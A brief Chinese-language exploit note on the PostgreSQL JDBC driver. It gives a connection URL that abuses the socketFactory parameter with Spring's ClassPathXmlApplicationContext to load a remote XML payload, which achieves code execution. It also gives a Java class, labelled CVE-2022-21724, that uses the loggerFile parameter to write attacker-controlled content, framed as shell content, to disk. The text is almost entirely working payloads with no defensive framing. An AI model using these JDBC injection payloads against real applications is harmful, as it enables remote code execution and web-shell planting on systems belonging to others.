# PostgreSql

## 构造方法调用

DriverManager.getConnection("jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");

也可使用file:，jar:file: 去加载本地文件。

ClassPathXml支持Ant表达式，即可以使用 file:///${catalina.home}/**/*.tmp 的方式加载文件。



## 写文件

```java
public class cve202221724 {
    public static void main(String[] args) throws SQLException {
        String loggerLevel = "debug";
        String loggerFile = "test.txt";
        String shellContent="test";
        String jdbcUrl = "jdbc:postgresql://127.0.0.1:5432/test?loggerLevel="+loggerLevel+"&loggerFile="+loggerFile+ "&"+shellContent;
        Connection connection = DriverManager.getConnection(jdbcUrl);
    }
}
```

不过这样写保存的文件前后会有脏字符。